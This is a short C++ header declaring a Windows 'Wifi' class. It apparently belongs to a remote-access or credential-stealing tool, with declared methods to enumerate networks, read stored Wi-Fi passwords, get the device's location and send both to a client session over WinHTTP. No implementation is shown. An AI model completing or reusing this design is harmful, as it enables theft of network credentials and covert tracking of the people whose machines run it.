
#pragma once
#include <windows.h>
#include <wlanapi.h>
#include <winhttp.h>
#include<thread> 
#include <sstream>
#include <atlstr.h>
#include "Utils.h"
#include "PublicStructures.h"
#include "HttpRequests.h"
#include "ConnectionFunctions.h"
#include "JsonFunctions.h"


#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

#ifdef _DEBUG
// Wifi class
#endif
class Wifi
{

private:
	PublicStructers PublicStructers;
	HttpRequests WinHttpRequests;
	ConnectionFunctions ConnectionFunctions;
	string allPasswords;
	struct PublicStructers::Network networks[10];

	void EnumerateWifi();

	string GetLocation();

	CString StringToHexString(CString cs);

	void GetWifiPasswords();

public:

	bool GetWifiStatus();
	

	void SendLocationThread(PublicStructers::ClientSession session);
	

	void GetWifiPasswordsThread(PublicStructers::client clientInfo);
};

